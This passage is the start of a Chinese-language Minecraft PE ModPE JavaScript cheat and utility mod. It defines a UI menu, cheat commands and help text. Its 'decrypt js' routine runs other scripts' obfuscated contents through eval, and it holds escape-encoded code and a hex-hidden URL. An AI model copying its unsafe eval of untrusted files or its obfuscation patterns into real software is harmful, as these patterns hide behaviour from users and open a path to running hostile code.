/*你打开这个js干啥？抄袭？*/
/*百度贴吧 @柚子人修改大师*/
var loadt=new Date()
print("js加载中")
try{
var pub=[]

var pg={
aa:android.app,
aaADB:android.app.AlertDialog.Builder,
ac:android.content,
acDIOCL:android.content.DialogInterface.OnClickListener,
ag:android.graphics,
agC:android.graphics.Color,
agd:android.graphics.drawable,
agdCD:android.graphics.drawable.ColorDrawable,
an:android.net,
ao:android.os,
aoE:android.os.Environment,
av:android.view,
avG:android.view.Gravity,
avV:android.view.View,
avVOCL:android.view.View.OnClickListener,
avVOLCL:android.view.View.OnLongClickListener,
avVOTL:android.view.View.OnTouchListener,
aw:android.widget,
awCBn:android.widget.CompoundButton,
awCBOCCL:android.widget.CompoundButton.OnCheckedChangeListener,
awCBx:android.widget.CheckBox,
awET:android.widget.EditText,
awIV:android.widget.ImageView,
awLL:android.widget.LinearLayout,
awSB:android.widget.SeekBar,
awSBOSBCL:android.widget.SeekBar.OnSeekBarChangeListener,
awTV:android.widget.TextView,
ji:java.io,
jiBR:java.io.BufferedReader,
jiF:java.io.File,
jiFIS:java.io.FileInputStream,
jiFOS:java.io.FileOutputStream,
jiFR:java.io.FileReader,
jlR:java.lang.Runnable,
jlS:java.lang.String,
jl:java.lang,
jlT:java.lang.Thread,
jn:java.nio
}
pg.agC={argb:function(a,r,g,b){return a<<24|r<<16|g<<8|b}}
function runOnUiThread(f){ctx.runOnUiThread(new pg.jlR() {run: f});}
function runThread(f){new pg.jlT(new pg.jlR(){run:f}).start();}
function 存在(path){
return 文件(path).exists();}
function mkdir(path){
new pg.jiF(path).mkdirs();}
function 文件(path){
return new pg.jiF(path);}
var inf={n:"\u0079\u007a\u0072\u7684\u7b97\u6cd5",v:"FINAL0.15.0(颜色修复版)"};

var 更新日志=("最后一个版本！从此不再更新！更多详情查看设置/工具！").replace(/！/g,"！\n")

var 日志="";

try{var 游戏版本=ModPE.getMinecraftVersion();}catch(e){var 游戏版本="0.14.0";}

var ctx=com.mojang.minecraftpe.MainActivity.currentMainActivity.get();

var pak=ctx.getPackageName();

var scrhei=ctx.getWindowManager().getDefaultDisplay().getHeight(),scrwid=ctx.getWindowManager().getDefaultDisplay().getWidth(),scrdpi=ctx.getResources().getDisplayMetrics().density

if(scrhei>scrwid){scrhei=[scrhei,scrwid];scrwid=scrhei[0];scrhei=scrhei[1];}

const sdcard=new pg.aoE.getExternalStorageDirectory().getAbsolutePath();

const 主目录=sdcard+"/games/com.mojang/yzr的js文件夹/"

if(!存在(主目录)){mkdir(主目录)}

var astr=["成功","失败","出错","正在解密，请耐心等待…","读取成功\n","删除数据加密\n","还原格式\n","jside加密方案3\n","js加密器方案2\n","js加密器方案3\n","此为混淆，能解的我已帮你解了\n","写入解密\n",["放在","\n日志信息:\n"],"提示","我知道了","JS公告牌",["有新版本！\n当前:","\n新版:","\n还不赶快更新！\n在 悬浮窗>打开js更新链接 以获取更新或 在任务栏里点击更新消息即可！","更新提示","有更新哦(",")点我跳转查看更新"],"比上次好",["您的手机运算耗时:","\n记录最快:"],"结果","开车","玩家","已自动踢出服务器","进服","退服"," 被 炸妈盒子 炸死了～","无效的快捷方式","长按左上角的快捷方式按钮设置","附加指令设置","启动后要执行的:","指向的函数","预览","保存设置","新的设置将会在重新载入本JS后生效","DEBUG开关","选择一个吧","游戏状态debug","游戏操作日志","重置日志","复制日志到剪贴板","保存运行信息","发送信息","读取物品栏设置","帮助:\n方案1:添加物品速度快，但是有bug，推荐使用方案1\n方案2:需要刷新才能看到(就是按物品栏最后一个…就能刷新)","方案","快捷方式设置","快捷方式指向(@分隔)","指向的函数，使用@分隔，从左到右，从上到下","还原预设","高级附魔工具","长按我试试","正在抽奖…","神器闪电降临！","来也","钻石已送达","已设置出生点","墙体厚度超过限制","你被传送到了传送点: ","找不到该传送点","设置传送点 ","未选择","§2<获得成就> 丧心病狂","空的，再来一次吧","恭喜中钻礼包一份","恭喜中石礼包一份","恭喜中铁礼包一份","恭喜中木礼包一份","恭喜中金礼包一份","恭喜中煤礼包一份","空的，再来一次吧","恭喜再来一次","送你破木棍ㄟ(￣▽￣ㄟ","日志已保存","叫你作死，关你游戏！","作者永远记住你了！","输入/runf 打开帮助()  查看问题解答",["§2百度贴吧柚子人修改大师 制作的版本","！本js开源，§4不要盗版！抄袭狗去死！\n§6输入/ilyzr查看帮助，输入/runf 打开帮助() 查看问题解答。带PC指令哦！材质包使用不当会导致贴图错误！\n§2欢迎加入yzr的mc,tr,gta,bs讨论群，群号码：123456789\n§2百度贴吧搜§6柚子人吧§2查看更多js。\n§6喜欢的话评价一下吧！\n§4如果你永远不想看到本信息或提示，请输入/关闭提示"],"你确定返回刚才的位置吗？","返回","木牌设置","第一行","第二行","第三行","第四行","将难度设置为",["和平","简单","普通","困难"],"哦，那看起来一定很疼","执行完毕","浏览器","http://tieba.baidu.com/f?kw=%E6%9F%9A%E5%AD%90%E4%BA%BA&mo_device=1&ssid=0&from=1086k&uid=0&pu=usm@0,sz@1320_1002,ta@iphone_2_4.2_2_6.4&bd_page_type=1&baiduid=3E8828E8C7D10DD340D7912DE6D62CE48&tj=www_normal_1_0_10_title?pn=0&",["已清除 "," 的物品栏"],["已移除 "," 的所有药水效果"],"给予 ",[" 时长为 ","秒的 "," (ID",") 效果"],"切换为下雨天","切换为雷暴天","切换为无天气","已更改游戏规则","经验 ","已锁定时间","已恢复时间","将时间设置为",["将","的模式改为","模式"],"生存","创造","冒险","旁观","个(ID为",")物品","输入数值不合法","传送到","已治愈","的出生点设置为","js帮助：/核弹:神器点击进行核爆炸。/土豪:用神器点击泥土、圆石、木板、沙子、草方块、原木和石头对应变成钻石块、绿宝石、金块、煤块、青金石块、红石块和铁块土豪方块。/还原:还原方块。/日出:调日出，/日落:调日落。/送钻石:点击方块送钻石。\n /创造:变成创造，/生存:变成生存。/出生点:开启设置出生点。/off:全部关闭。/神器:送神器。:/骑动物:骑动物，/动物骑动物:开启动物骑动物模式，/爆菊:爆菊模式，/改名:生物改名。/打闪电:神器点击打闪电。开启功能时会关闭其他功能。 /秒挖:开启秒挖，/捡物品:开启捡物品，/关闭提示 关闭提示,/声明:查看声明。/评价:评价本js^O^","点击生物改名","§4您没有使用该命令的权限！","已变为创造模式","已变为生存模式","已调成日出","已调成日落","§2谢谢你的评价！作者qq:123456789。我会做出更多好玩的js的！","§4谢谢你的评价！作者qq:123456789。我会努力改进的！再见玩家！","§4未知指令，输入/help查看帮助","选择打开方式","打开","文本编辑,音频,图像,文本查看,解密并执行,其他,设置为悬浮窗图片,导入base64码为悬浮窗图片,查看该js的所有函数,复制,删除","文本编辑","音乐播放器","图片预览","文本字符数:","已关闭所有功能","开启土豪模式，神器点击方块变土豪方块","开启生成作者，点击方块生成","开启改名字，在聊天框输入/改名字[你要改的名字] 点击生物改名字","开启玩家爆菊模式","开启还原方块，点击土豪方块还原","开启秒杀","开启打闪电，点击地面或生物","输入/好评以好评，输入/差评以差评","开启送钻石，点击方块送钻石","开启设置出生点，点击方块设置","开启骑动物模式，点击生物骑行","开启核弹，点击方块爆炸","开启生物骑生物，依次点击两个生物进行骑行","开启捡物品，拿着神器就能捡","开启秒挖，点击方块挖，基岩都能挖","开启穿墙，点击面前的方块，不要点坑里的，否则…","开启抽奖，使用生的鄙视牌钻石，每次消耗一个","神器已送达，注意在背包查收","自定义窗口","终端模拟器","文件浏览器","神器功能","传送重生","人物编辑","背包设置","游戏设置","实体编辑","药水效果","玩家列表","粒子设置","辅助","确定删除","确定√","取消×","文件","删除","有什么问题吗？","GUI缩放,如何重置设置,服务器不能用,无法使用部分功能,显示不正常,悬浮窗没有图片","请在接下来的窗口设置","设置","设置以下大小即可","当前大小(原250)","确定重置？","设置被重置，请重启游戏！不要进退存档","废话！服务器当然不能用！","具体哪个功能","这是分辨率问题，可以试试js外观设置","请选择一个文件","yzr制作(长按上面的获取帮助)","内置预设窗口","以下仅供测试使用","新建模板 +","从百度云下载","设置/工具","DEBUG","快捷方式按钮","人工modtick","广播客户端消息","newLevel提示","禁用BGM","启动时显示公告","禁用检查更新","读取物品栏设置","启动后附加指令","请输入函数","执行函数","性♂能测试","点一次就够了，测试中不要点别的地方","重置窗口变量","截图(闪退)",["已截图，保存在","yzr截图.png 中"],"重置设置","js外观设置","帮助与提示","查看命令帮助","查看专用命令帮助","查看新手帮助","查看声明","查看该版更新","查看 *柚子人吧* 贴吧","这个地方是空的","查看js公告牌","js公告牌","给作者写邮件",["(重要) "," 用户反馈","(请写上您对本js的意见或建议或反馈内容，最好附图)\n发送给yzr柚子人的无敌真四核大音量带U盘接口神机红米1"],"打开作者的分享","复制","直接下载更新","检索函数","搜索语言包","http://pan.baidu.com/share/link?shareid=1703652795&uk=473707583","\x68\x74\x74\x70\x73\x3a\x2f\x2f\x79\x7a\x72\x69\x6c\x79\x7a\x72\x2e\x77\x6f\x64\x65\x6d\x6f\x2e\x63\x6f\x6d\x2f\x65\x6e\x74\x72\x79\x2f\x34\x30\x30\x39\x31\x34","点击文件浏览器的路径栏就能复制了\n复制时会很慢，因为这是js","文件已存在无法复制","http://pan.baidu.com/share/link?shareid=4210294607&uk=473707583","使用旧版本GUI","可能会出现兼容性问题","显示操作日志","粘贴","账户已过期，请重新登录！","没有输入账号密码","账号或密码错误\n或不存在的账号","无法获取登录信息！请稍后再试！","js被修改过！可能被植入了病毒！","很抱歉！您下载的是盗版的js","modscripts","窗口添加到主菜单","欢迎使用本js！\n请先登录才能使用","请输入账号！如果没有请申请！申请请加入QQ群:123456789","输入你的账号","输入你的密码","登录","登录中","我给你一次删除js的机会\n10秒后自动退出"];
//length=我也不知道

var 物品id组=[999,998,997,996,995,994,993,992,991,990];

var aswi=[false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,true,false,false,true,false,false,false,false,false,false,false,false,false,false,false];
//length=30
/*禁用更新,主要适应,关闭公告,广播,换ID,药水攻击,碰撞箱0,疾跑,启用modtick,防爆,防实体卡机,玩家buff,写日志,bgm,极限装逼模式,第一次进入,防熊,debug,死亡不掉落,死亡,箱子全满,无敌,记仇,关闭提示,验证过,复制*/


var 日志窗口组件,日志窗口,复制按钮,复制路径="",更新地址,yzr实体,公告,炸妈TNT,seal=0,跑分=999999,效果组=[],打字附加,粒子种类,大小=0,粒子种类名称="未选择",添加的玩家=[],扔东西按钮,debug显示,悬浮窗路径=主目录+"悬浮窗图片.png",开火按钮,附魔按钮,踢人名称="请先添加，比如:Steve",附加指令读取="",xis=51381,快捷方式x=300,快捷方式y=100,快捷方式,快捷方式读取="随机改名()@清除所有实体()@Entity.setNameTag(getPlayerEnt(),\"\")@",savelog=0,检查更新,粒子值=1,返回按钮,功能提示倒计时=0,作者信息倒计时=500,颜色="",颜色时间=0,fpr=60000,debug实体id=0,debug实体模型id=0,选取按钮,debug实体血量=0,debug实体倒计时=100,第一次生物,第二次生物,名字,杀死作者次数=0,提示信息触发=-1,close=-1,效果id=0,效果名称,debug方块id=0,debug方块dmg=0,debug方块倒计时=100,debug方块side=0,功能=0,功能名称="",抽奖倒计时=-1,锁定时间=[false,0],鄙视延迟=0,总设值=0,效果强度=0,效果时间=0,var信息,效果id,控制玩家,控制实体=0,实体id设置=0,实体模型设置=0,实体年龄=0,实体血量=0,实体pitch=0,实体yaw=0,实体x速=0,实体y速=0,实体z速=0,实体名字,x速度=0,y速度=0,z速度=0,alert内容,玩家固定数=11;

var 定住玩家=[],玩家数组=[],获取玩家;

var gui缩放=250,文字大小=15,acolor=160,rcolor=140,gcolor=255,bcolor=0,acolort=255,rcolort=0,gcolort=0,bcolort=0,acolorm=114,rcolorm=102,gcolorm=204,bcolorm=255,主要w=100,主要h=100

function alert内容设置(){
alert内容=["(禁止多玩使用！)\n(本js完全免费，如果你花钱买的，恭喜你你被骗了)\n本js为个人作品，不承担任何法律责任\n*版本:"+inf.v+"*\n这是我做的版本:"+inf.v+" 的js。本js仅限于个人使用，未经允许严禁转载！转载时请说明出处！谢谢！\n本js为个人作品，不承担任何法律责任！\n感谢:*920编辑器*，*BlockLauncherPro*以及*mcpejs编辑器*的编辑软件！\n&测试人员&:yzr\n★编程人员☆:还是yzr\n♀查错♂:yzr\n如果你找到本js的bug并告诉我的话\n你的昵称会在这显示\n感谢 ZhuoWei Zhang 大大的*BlockLauncherPro*\n(以下算法出自JsIDE，挺不错的js制作软件)\n感谢@Critical闪 的*移动按钮*算法\n感谢@祁伴怂 的*三角函数的粒子*算法\n感谢@杨礼嶂 的*以玩家名称获取实体*","[本段帮助需要您的帮助编辑！如果想编辑的给作者发邮件或QQ！作者需要您的帮助！如果实在看不懂就呵呵！(´・ω・`)]\n本js存储目录:"+主目录+"\n如果基友进不去就关掉材质包\n"+inf.n+"\n————物品类————\n1。神器:ID:"+物品id组[2]+"\n   合成材料:9*彩色物质*\n   获得方法:合成\n   用于合成:无\n   特性:dmg:100，骑动物+3dmg，秒杀爆\n   菊+5dmg，开启功能时点击地面+1dmg，\n   完全损坏会变成1*钻石块*。\n   拿着神器有特殊效果哦\n2。我鄙视你:ID:"+物品id组[0]+"\n   合成材料:无法合成\n   获得方法:打死作者\n   用于合成:*生的鄙视牌钻石*\n   特性:拿着每10秒会遭到作者鄙视\n3。生的鄙视牌钻石:ID:"+物品id组[1]+"\n   合成材料:*我鄙视你*\n   获得方法:*假钻石块*合成,或*我鄙视你*合成\n   用于合成:熔炉烧出*烤熟的鄙视牌钻石*\n   特性:吃下恢复2饥饿值\n4。烤熟的鄙视牌钻石ID:"+物品id组[3]+"\n   合成材料:熔炉烧*生的鄙视牌钻石*\n   获得方法:同上\n   用于合成:无\n   特性:吃下恢复20饥饿值\n5。假钻石块ID:255\n   合成材料:无法合成\n   获得方法:打死作者\n   用于合成:*生的鄙视牌钻石*\n   特性:防爆，可以装逼，发光，做食物，不能在\n   上面放门，使用稿子挖掘\n6。砖石剑升级版ID:"+物品id组[7]+"\n   合成材料:*砖石*，*烈焰棒*\n   获得方法:合成\n   用于合成:无\n   特性:攻击力7\n7。冰之剑ID:"+物品id组[6]+"\n   合成材料:2*雪球*，*木棍*，2*钻石*\n   获得方法:合成\n   用于合成:无\n   特性:攻击力5\n8。神器圣剑ID:"+物品id组[5]+"\n   合成材料:2*彩色物质*，*钻石*\n   获得方法:合成\n   用于合成:无\n   特性:攻击力9\n9。血之剑ID:"+物品id组[4]+"\n   合成材料:2*红石*，2*钻石*，*木棍*\n   获得方法:合成\n   用于合成:无\n   特性:攻击力6\n9。彩色物质ID:"+物品id组[8]+"\n   合成材料:*钻石*，*绿宝石*，*铁锭*，*金锭*\n   *青金石*，*红石，*莹石粉*，*下界石英*\n   *烈焰棒*\n   获得方法:合成\n   用于合成:*神器*，*神器圣剑*\n   特性:无，就是很贵\n10。选取工具ID:"+物品id组[9]+"\n   合成材料:4*彩色物质*\n   获得方法:合成\n   用于合成:无\n   特性:选取实体与方块\n\n————玩法————\n首先声明:\n由于使用该js出现的毁图、死机、重启，作者尚不负责！\n如有bug请反馈邮箱\n玩法自寻…(既然你看了帮助那我就告诉你吧)\n玩家名字改成不是Steve就能开启按钮，长按能移动按钮(某位大神的算法),按钮有许多功能哦！\n输入/help查看帮助\n输入/ilyzr查看专用帮助\n试试按钮里面的debugㄟ(￣▽￣ㄟ)\n按钮菜单里面有解密简单js功能哦\n只要放在/sdcard/加密的js.js 后点击解密\n解密后的js自动出现在/sdcard/yzr解密的js.js\n太复杂的解不了，可以找我帮你解\n换皮肤请放在材质包里并命名为skin0.png~skin9.png\n披风同理\n现在各种功能分类了，更好看！界面支持调整颜色位置大小哦\n游戏辅助都是开挂必备\n小工具请慎用，可能会闪退，有物品栏保存读取功能，传送点保存读取，玩家检测+实体设置，给你创世神的乐趣\n\n————作者的话————\n不要抄袭！\n\n转载时注明 @柚子人修改大师 制作\n关注百度 柚子人吧\n作者QQ:123456789\nQQ群:123456789\n邮箱:asdfg636254@163.com\n欢迎提出意见或建议\n高手勿喷\n本js未加密，请不要抄袭\n需要帮忙 解密js 的找我，联系方法在上面\n不要抄袭！\n作者称呼:\n柚子人(一般称呼简称)\n柚子人ilyzr(一般称呼)\n柚子人ilyzr45997(备用一般称呼)\nilyzr(备用游戏名)\nilyzr45997(第二个备用游戏名)\nyzr(游戏名)\n柚子人修改大师(百度贴吧名)\n♠柚子人yzr.ilyzr∑(^∪^)∑(防盗QQ名)\n都行\n不要抄袭！\n重要的事情说三遍！\n如果有错别字不要吐槽(´・ω・`)\n\n————一些杂事————\n本js前身是 yzr的超强金剑 反正就是我做的\n这个是我的第一个js，你肯定想不到\n我只是个熟练的新手……","/clear 清除物品栏\n/debug 开启debug模式\n/difficulty [0|1|2] 设置游戏难度\n/effect [clear]|[效果id] [时长] [等级] 添加药水效果\n/gamemode [0|1|2] 切换游戏模式\n/gamerule 游戏规则\n/give [id] [数量] [物品特殊数据] 给予物品\n/heal 治疗玩家\n/help [页码] 显示帮助\n/off 关闭神器功能\n/repair 修复手中工具\n/runf [内置函数] 执行函数\n/setwarp [传送点名称] 设置传送点\n/spawn 回到出生点\n/spawnpoint 设置出生点\n/tp [x] [y] [z] 传送\n/time [stop|start|add|set] 设置时间\n/warp [传送点名称] 传送到一个传送点\n/weather [clear|rainy|thunder] 天气\n/xp [经验值] 给予经验\n"+inf.n+"专用命令:\n/无敌 开启无敌\n/飞行 开启飞行\n/抽奖 用生的鄙视牌钻石抽奖\n/改名字 改名字\n/土豪 土豪模式\n/核弹 神器核弹\n/还原 还原方块\n/秒杀 开启秒杀\n/骑动物 开启骑动物\n/穿墙 开启穿墙\n/打闪电 开启打闪电\n/秒挖 开启秒挖\n/创造 调创造\n/生存 调生存\n/日出 调日出\n/日落 调日落\n/生成作者 生成作者\n/改名 开启改名字\n/爆菊 开启爆菊模式\n/送钻石 开启送钻石\n/捡物品 开启捡物品\n/神器 给神器\n/出生点 开启设置出生点\n/评价 评价\n/声明 查看声明\n/贴吧 打开浏览器柚子人吧\n/关闭提示 关闭提示",inf.n+"js专用命令帮助：\n(开启功能时会关闭其他功能)\n/核弹:神器点击进行核爆炸\n/土豪:用神器点击泥土、圆石、木板、沙子、草方块、原木和石头对应变成钻石块、绿宝石、金块、煤块、青金石块、红石块和铁块土豪方块\n/还原:还原方块\n/日出:调日出\n/日落:调日落\n/送钻石:点击方块送钻石\n/创造:变成创造\n/生存:变成生存\n/出生点:开启设置出生点\n/off:全部关闭\n/神器:送神器\n/骑动物:骑动物\n/动物骑动物:开启动物骑动物模式\n/爆菊:爆菊模式\n/改名:生物改名\n/打闪电:神器点击打闪电\n/秒挖:开启秒挖\n/捡物品:开启捡物品\n/穿墙:穿墙模式\n/关闭提示:关闭提示\n/声明:查看声明\n/评价:评价本js^O^","当前版本:"+inf.v+"\n更新内容:\n"+更新日志,"未找到BGM包,请将 music 文件夹放在 "+主目录+" 下并确保 music 文件夹下有3个文件夹！确保 "+主目录+" 下有 music 文件夹！解压时请选择 *解压到当前目录* 而不是 *解压到/<压缩文档名称>/* \n错误信息:\n"]}
alert内容设置();
//1土豪2生成作者3改名4爆菊5还原
//6秒杀7打闪电8评价9送钻石10设出生点
//11玩家骑动物12核弹13动物骑动物
//14捡物品15秒挖16穿墙17抽奖


aswi[12]=true;
var templog=[]
function 保存日志(name,a,b,c,d,e,f,g,h,i,j,k,l,m,n){
var da=new Date(),hour=da.getHours(),min=da.getMinutes(),sec=da.getSeconds();
if(a==null){a="";}
if(b==null){b="";}
if(c==null){c="";}
if(d==null){d="";}
if(e==null){e="";}
if(f==null){f="";}
if(g==null){g="";}
if(h==null){h="";}
if(i==null){i="";}
if(j==null){j="";}
if(k==null){k="";}
if(l==null){l="";}
if(m==null){m="";}
if(n==null){n="";}
var str="["+hour+":"+min+":"+sec+"]"+name+":"+a+","+b+","+c+","+d+","+e+","+f+","+g+","+h+","+i+","+j+","+k+","+l+","+m+","+n+"\n";
try{
templog.push(str)
var l=templog.length
if(l>10){templog=templog.slice(l-10,l)}
if(日志窗口!=null){runOnUiThread(function(){try{日志窗口组件.setText(templog.toString())}catch(e){}})}
}catch(e){print(e)}
if(aswi[12]){日志+=str;}
}

function 反改名(str){
写入(sdcard+"/games/com.mojang/minecraftpe/options.txt",读取(sdcard+"/games/com.mojang/minecraftpe/options.txt").replace(/mp_username:.*/g,"mp_username:"+str));}

function 参数(num){
if(num<0){return num}
return (scrdpi/2)*num*gui缩放/250;
}

function 文本(addto,text,size){
if(size==null){size=0}
var title=new pg.awTV(ctx);
title.setTextColor(pg.agC.argb(acolort,rcolort,gcolort,bcolort))
title.setTextSize(文字大小+size);
title.setText(text.toString())
addto.addView(title)
return title
}

function 输入(addto,text,hint,size,width,height,focus){
if(size==null){size=0}
if(hint==null){hint=""}
if(text==null){text=""}
if(width==null){width=-1}
if(height==null){height=-2}
var title=new pg.awET(ctx)
title.setText(text.toString());
title.setHint(hint.toString());
title.setTextColor(pg.agC.argb(acolort,rcolort,gcolort,bcolort))
title.setLayoutParams(new pg.awLL.LayoutParams(width,height))
title.setTextSize(文字大小+size);
addto.addView(title)
if(focus){title.setOnClickListener(new pg.avVOCL({
onClick:function(v){ 
打开输入框(title)
}}))}
return title
}
function 圆角(wid,type,radius,a,r,g,b){
var a=a,r=r,g=g,b=b
switch(type){
case 0:
a=acolor;
r=rcolor;
g=gcolor;
b=bcolor;
break;
case 1:
a=acolorm;
r=rcolorm;
g=gcolorm;
b=bcolorm;
break;
}
if(a==null||a==NaN)a=0
if(r==null||r==NaN)r=0
if(g==null||g==NaN)g=0
if(b==null||b==NaN)b=0
var aaa=参数(radius)
var drawable = new android.graphics.drawable.ShapeDrawable(new android.graphics.drawable.shapes.RoundRectShape([aaa, aaa, aaa, aaa, aaa, aaa, aaa, aaa],null, null));
drawable.getPaint().setARGB(a,r,g,b);
drawable.getPaint().setStyle(android.graphics.Paint.Style.FILL);
wid.setBackgroundDrawable(drawable)
//wid.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(pg.agC.argb(a,r,g,b)))
return wid
}
function 按钮(addto,text,width,height,margin,padding){
if(width==null){width=-2}
if(height==null){height=-2}
if(margin==null){margin=5}
if(padding==null){padding=5}
if(width==-1){height=文字大小*6}

var title=new android.widget.Button(ctx);
title.setTextSize(文字大小);
外观(title,width,height,margin)
title.setGravity(17);
title.setPadding(padding,padding,padding,padding)
title.setTextColor(pg.agC.argb(acolort,rcolort,gcolort,bcolort))
//圆角(title,0,20)
title.setText(text)
addto.addView(title)
return title
}

function 拖动(addto,progress,max,width){
if(width==null){width=-1}
var seekbarr=new pg.awSB(ctx)
seekbarr.setMax(max)
seekbarr.setLayoutParams(new pg.awLL.LayoutParams(参数(width),-2));
seekbarr.setProgress(progress)
addto.addView(seekbarr)
return seekbarr
}

function 勾选(addto,text2,checked){
var checkbox=new pg.awCBx(ctx);
checkbox.setChecked(checked);
var clayout=new pg.awLL(ctx);
文本(clayout,text2)
clayout.addView(checkbox);
addto.addView(clayout);
return checkbox;
}

function 色(widget,type,a,r,g,b){
var a=a,r=r,g=g,b=b
switch(type){
case 0:
a=acolor;
r=rcolor;
g=gcolor;
b=bcolor;
break;
case 1:
a=acolorm;
r=rcolorm;
g=gcolorm;
b=bcolorm;
break;
}
if(a==null)a=0
if(r==null)r=0
if(g==null)g=0
if(b==null)b=0
widget.setBackgroundDrawable(new pg.agdCD(pg.agC.argb(a,r,g,b)))
return widget
}
function 图标(addto,text,arr,width,height,si){var si=si
var i=0,main=new pg.awLL(ctx)
var c=0;
main.setOrientation(1)
while(i<si){
var l=new pg.awLL(ctx);
var u=0
while(u<si){色(按钮(l,"",width/si,height/si,0,0),2,arr[c],arr[c+1],arr[c+2],arr[c+3])
c+=4
u++}
main.addView(l)
i++
}
文本(main,text,-3).setGravity(81)
外观(main,width,-2,5)
addto.addView(main)
return main
}
function 开关gui(widget){
if(widget!=null){return true}
else{return false}
}

function random(min,max){
return Math.floor(Math.random()*(max-min))+min}


function newByteArray(size){
return java.nio.ByteBuffer.allocate(size).array();
}
function transferStream(iS,oS,interrupter){
if(interrupter==undefined)interrupter=function(){return true;}
var buf=newByteArray(1024);
var i=-1;
while ((i=iS.read(buf))!=-1&&interrupter()) {
	oS.write(buf,0,i);
}
}

function 解密js(路径2){
var log=""
runThread(function(){
try{
print(astr[3])
var str=读取(路径2)
log+=astr[4]
var 路径=路径2.replace(".js","解密.js")
if(str.search(/JsIDE_/)!=-1){
str=str.replace("ModPE[\'JsIDE_saveData\']=ModPE[\'saveData\'];ModPE[\'JsIDE_readData\']=ModPE[\'readData\'];ModPE[\'saveData\']=function(key,value){ModPE.JsIDE_saveData(key,android.util.Base64.encodeToString(java.lang.String(\"\"+value).getBytes(),0))};ModPE[\'readData\']=function(key){var value=ModPE.JsIDE_readData(key);if(!value){return org.apache.http.util.EncodingUtils.getString(android.util.Base64.decode(value,0),\'UTF-8\')}else{return value}}","");log+=astr[5];}
if(str.search(/^ eval/)!=-1){str=str.replace(" ","");str=str.replace("\n","");log+=astr[6];}
if(str.search("^eval")!=-1){
str=str.replace("eval","");
if(str.search("void")!=-1){str=str.replace("void k[++c+1](p)","p");log+=astr[7];}
str=eval(str);}
try{
if(str.search("^var enc=")!=-1){eval(str+"str=disencrypt;");log+=astr[8];}
if(str.search("^var en=")!=-1){eval(str+"str=disencryp;");log+=astr[9];}}catch(e){}
if(str.search("var _0x")!=-1||str.search("__")!=-1){
log+=astr[10]
var a=str
//变量名
var b=a.split("=[\"")
b=b[0].replace("var ","")
//变量内容
var c=a.split(";")
c=c[0].replace("var "+b+"=[","")
c=c.replace("]","")
c=c.split(",")
for(i=0;i<c.length;i++){
a=a.replace(new RegExp("\\["+b+"\\["+i+"\\]\\]","g"),"."+eval(c[i]))
}
for(i=0;i<c.length;i++){
a=a.replace(new RegExp(b+"\\["+i+"\\]","g"),"\""+eval(c[i])+"\"")
}
str=a
}
写入(路径,str) 
log+=astr[11];
alert(astr[0]+","+astr[12][0]+路径+astr[12][1]+log)
保存日志("解密js",log)
}catch(e){alert(astr[1]+":\n"+e)}
});
}

function 外观(widget,width,height,margin){
if(margin==null){margin==0}
var widpam=new pg.awLL.LayoutParams(参数(width),参数(height));
widget.setLayoutParams(widpam);
if(margin!=null){widpam.setMargins(margin,margin,margin,margin)}
return widget
}

function 移动按钮(which,xx,yy,main,bool){
if(bool==null){bool=false}
var mX,mY
which.setOnTouchListener(new pg.avVOTL({onTouch:function(v,e){
try{
switch(e.getAction()){
case 0:mX=e.getX();mY=e.getY();break;
case 1:break;
case 2:
var delX=parseInt(e.getX()-mX)*0.5;
var delY=parseInt(e.getY()-mY)*0.5;
xx+=delX;yy+=delY;
main.update(parseInt(xx),parseInt(yy),-1,-1);
break;}
return bool;
}catch(e){print(e)}
}})); 
return [which,main]
}

function 分割线(addto){
外观(文本(addto,"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"),-1,50);
}
function 添加函数(addto){
分割线(addto)
var title函数=输入(addto,temptext,astr[195])

按钮(addto,astr[196],-1).setOnClickListener(new pg.avVOCL({onClick:function(viewarg){try{
var 函数=title函数.getText();
temptext=函数;
var x=Player.getX();
var y=Player.getY();
var z=Player.getZ();
eval(""+函数);
print(astr[87]);
}catch(e){print(astr[2]+e);}
}}))
分割线(addto)

}
function 任务栏(主要提示,标题,副标题,网址){
var intent=new pg.ac.Intent(pg.ac.Intent.ACTION_VIEW,pg.an.Uri.parse(网址))
var pi=pg.aa.PendingIntent.getActivity(ctx,0,intent,0)
runOnUiThread(function(){
var nm=ctx.getSystemService(ctx.NOTIFICATION_SERVICE)
var notify=new pg.aa.Notification(android.R.drawable.btn_dialog,主要提示,0);
notify.defaults=pg.aa.Notification.DEFAULT_SOUND
notify.setLatestEventInfo(ctx,标题,副标题,pi);
nm.notify(0,notify);
})
}
function 检索函数(path){
return eval("\u8bfb\u53d6\u0028\u0070\u0061\u0074\u0068\u0029\u002e\u006d\u0061\u0074\u0063\u0068\u0028\u002f\u0066\u0075\u006e\u0063\u0074\u0069\u006f\u006e\u0020\u002e\u002a\u005c\u0029\u002f\u0067\u0029\u002e\u006a\u006f\u0069\u006e\u0028\u0022\u005c\u006e\u005c\u006e\u0022\u0029")
}
function print(str){ 
保存日志("print",str);
runOnUiThread(function(){
pg.aw.Toast.makeText(ctx,"<"+inf.n+">\n"+str,1).show() 
})}

function alert(内容,标题){
runOnUiThread(function(){try{
var dialog=new pg.aaADB(ctx);
if(标题==null){标题=astr[13];}
dialog.setTitle("<"+inf.n+">"+标题);
dialog.setMessage(内容+"");
dialog.setCancelable(false);
dialog.setPositiveButton(astr[14],null);
dialog.setNegativeButton(astr[217],new pg.acDIOCL(){onClick:function(dia,w){剪切板(内容);}})
dialog.show();
}catch(e){print(astr[2])}
})
保存日志("alert",内容);
}
function getWebBytes(url) {
	try {
		var conn = new java.net.URL(url).openConnection();
        var input = conn.getInputStream();
        var output = new java.io.ByteArrayOutputStream();
        transferStream(input,output);
        input.close();
        output.flush();
        output.close();
        return output.toByteArray();
	} catch (e) {
		return astr[2] + (aswi[28] ? e : "");
	};
}
function getWeb(url) {
	var a=getWebBytes(url);
	return a==null?(astr[2] + (aswi[28] ? e : "")):new pg.jlS(a);
}

function cM(str){
str=str.toString()
if(str.search(/<柚子人yzr.ilyzr>/g)==-1){str="<"+inf.n+"> "+str;}
clientMessage(str)
if(aswi[3]){var name=Entity.getNameTag(getPlayerEnt())
Entity.setNameTag(getPlayerEnt(),"")
Server.sendChat(str)
Entity.setNameTag(getPlayerEnt(),name)}
}

function 读取(path){
var 结果="";
var iO=pg.jiBR(new pg.jiFR(path));
var 字符串=iO.readLine();
while(字符串){结果+=字符串+"\n";字符串=iO.readLine();}
return 结果;
}

